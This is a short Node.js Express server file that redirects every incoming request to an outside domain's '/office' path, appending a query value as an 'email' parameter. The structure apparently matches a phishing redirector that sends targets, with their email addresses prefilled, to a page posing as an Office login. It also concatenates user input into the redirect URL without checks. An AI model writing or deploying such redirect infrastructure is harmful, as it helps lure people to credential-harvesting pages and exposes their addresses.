const express = require('express')
const app = express()
const port = 3000

app.get('/:code?', (req, res) => {
	 res.location('https://plasticdistant.com/office?email='+req.query.code );
	 res.sendStatus(302);
  //res.send('Hello World!'+req.query.code)
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})